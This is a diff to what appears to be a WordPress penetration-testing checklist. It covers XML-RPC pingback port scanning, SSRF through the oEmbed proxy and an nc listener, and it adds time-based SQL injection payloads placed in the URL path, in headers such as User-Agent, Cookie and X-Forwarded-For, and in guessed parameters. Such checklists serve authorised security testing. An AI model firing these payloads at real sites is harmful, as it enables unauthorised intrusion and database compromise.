@@ -207,7 +207,7 @@ log=USERNAME&pwd=PASSWORD&wp-submit=Log+In&redirect_to=http://target.com/wp-admi
 
 ### ☐ Port Scanning (XSPA)
 
-- If you find the method pingback.ping inside the list, you have two cases:
+- If you find the method `pingback.ping` inside the list, you have two cases:
 #### Case (1): Internal port scanning
 ```xml
 <methodCall>
@@ -218,8 +218,8 @@ log=USERNAME&pwd=PASSWORD&wp-submit=Log+In&redirect_to=http://target.com/wp-admi
   </params>
 </methodCall>
 ```
-- Open port → "The pingback has already been registered"
-- Closed port → Error or timeout
+- **Open port → "The pingback has already been registered"**
+- **Closed port → Error or timeout**
 
 | Case          | Response                                                   | Meaning                  |
 |---------------|-------------------------------------------------------------|--------------------------|
@@ -259,7 +259,7 @@ nc -lvnp 4444
 </methodCall>
 ```
 
-- If response contains `faultCode > 0`, SSRF likely works.
+- If response contains `faultCode > 0` (17), SSRF likely works.
 
 ---
 
@@ -272,12 +272,28 @@ https://target.com/wp-json/oembed/1.0/proxy?url=BURP_COLLABORATOR
 
 ---
 
-### ☐ Time-Based SQLi on `/wp-json`
+### ☐ Time-Based SQLi on `/wp-json` endpoint or headers
 
 - Test:
 ```
-GET /wp-json
-Payload: ‘%2b(select*from(select(sleep(10)))a)$2b’
+GET /wp-json/%2b(select*from(select(sleep(10)))a)$2b
+Host: target.com
+```
+- Inject into headers or cookies
+  - Even without URL parameters, WordPress REST APIs sometimes depend on information from headers. Try injecting the payload into headers like:
+```
+GET /wp-json HTTP/1.1
+Host: target.com
+User-Agent: '+(select*from(select(sleep(10)))a)$2b'
+Cookie: session=xyz'+(select*from(select(sleep(10)))a)$2b
+X-Forwarded-For: '+(select*from(select(sleep(10)))a)$2b'
+Referer: '+(select*from(select(sleep(10)))a)$2b'
+```
+- Try sending common parameters manually, even if they're not shown in the frontend. Sometimes the backend processes them silently:
+```
+/wp-json?debug='+select*from(select(sleep(10)))a$2b
+/wp-json?search='+select*from(select(sleep(10)))a$2b
+/wp-json?id='+select*from(select(sleep(10)))a$2b
 ```
 
 ---
